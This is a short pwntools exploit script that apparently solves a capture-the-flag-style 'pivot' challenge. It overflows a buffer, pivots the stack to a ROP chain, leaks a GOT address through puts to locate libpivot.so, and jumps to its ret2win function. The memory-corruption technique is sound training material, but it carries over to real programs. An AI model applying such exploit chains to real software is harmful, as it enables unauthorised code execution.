from pwn import *

elf = context.binary = ELF("./pivot", checksec=False)
lib = ELF("./libpivot.so", checksec=False)

r = process()

POP_RSP_R13_R14_R15 = p64(0x0000000000400a2d)
POP_RAX = p64(0x00000000004009bb)
POP_RDI = p64(0x0000000000400a33)
RET = p64(0x00000000004006b6)

r.recvuntil(b"pivot: ")
PIVOT = int(r.recvline()[:-1].decode(), 16)


#padding for POP R13/R14/R15, leaking the lib offset then restarting the binary
payload = B"A"*24 + p64(elf.plt["foothold_function"]) + POP_RDI + p64(elf.got['foothold_function']) + p64(elf.plt["puts"]) + p64(elf.sym["_start"])
r.sendline(payload)

#gdb.attach(r)

#pivot to the rop chain
payload = b"A"*40 + POP_RSP_R13_R14_R15 + p64(PIVOT) 
r.sendline(payload)

r.recvuntil(b"libpivot\n")
leak = u64(r.recvline()[:-1].ljust(8, b"\x00"))

lib.address = leak - lib.sym["foothold_function"]


r.sendline(b"1")
#call win with the previously found offset
payload = b"A"*40 + p64(lib.sym["ret2win"])
r.clean()
r.sendline(payload)

r.interactive()